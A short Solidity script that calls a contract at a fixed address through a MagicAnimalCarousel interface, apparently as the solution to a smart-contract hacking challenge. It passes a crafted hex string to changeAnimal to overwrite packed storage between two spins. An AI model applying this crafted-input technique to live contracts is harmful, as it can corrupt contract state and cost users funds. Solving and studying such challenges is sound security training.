// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for MagicAnimalCarousel
interface MagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 index) external;
}

contract RunTest {
    // This function can be executed in Remix without vm
    function run() public {
        address targetAddress = address(0xFa86Ff9D663e06Ac0a5598292458A13951f131ac);  // Target address to interact with
        
        // Initialize contract instance
        MagicAnimalCarousel carousel = MagicAnimalCarousel(targetAddress);

        // Animal data (can adjust the bytecode if needed)
        string memory animal = string(abi.encodePacked(hex"10000000000000000000ffff"));

        // Interact with the contract
        carousel.setAnimalAndSpin("Pikachu");
        carousel.changeAnimal(animal, 1);
        carousel.setAnimalAndSpin("Charmander");
    }
}
